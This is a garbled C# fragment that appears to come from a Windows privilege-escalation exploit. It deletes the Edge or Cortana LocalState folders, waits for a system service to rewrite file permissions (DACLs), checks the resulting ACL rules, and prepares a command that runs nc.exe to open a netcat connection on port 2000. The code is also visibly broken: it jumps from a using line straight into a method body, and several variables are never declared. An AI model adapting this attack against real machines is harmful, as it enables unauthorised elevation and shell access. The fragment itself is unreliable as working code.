﻿using System;
            Console.WriteLine(arg2);
            int option = 0;
            option = int.Parse(arg2);
            option = Convert.ToInt32(arg2);
            String LocalState;

            switch (option)
            {
                case 1:
                    Console.WriteLine("Using Edge option");

                    KillEdge();
                    LocalState = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\LocalState";
                    Console.WriteLine($"[+] Removing {LocalState}");
                    try
                    {
                        Directory.Delete($@"{LocalState}", true);
                    }

                    catch { }
                    break;
                case 2:
                    Console.WriteLine("Using Cortana option");

                    if (GetCortana() == 0)
                    {
                        Console.WriteLine("[+] Cortana disabled");
                        return;
                    }

                    string AppData = Environment.GetFolderPath((Environment.SpecialFolder.LocalApplicationData));
                    LocalState = AppData + $@"\packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState";

                    Console.WriteLine($"[+] Removing {LocalState}");


                    try
                    {
                        Directory.Delete($@"{LocalState}", true);
                    }


                    catch { }
                    break;
                default:
                    Console.WriteLine("Invalid Option");
                    return;
            }


            string temporary = @"C:\temp";
                System.Threading.Thread.Sleep(2000);
                string strCmdPopp = @" /C C:\temp\nc.exe 127.0.0.1 2000";


                        



            // Give the service some time to rewrite DACLs
            System.Threading.Thread.Sleep(2000);

            fc = false;

            foreach (FileSystemAccessRule rule in acl.GetAccessRules(true, true, typeof(NTAccount)))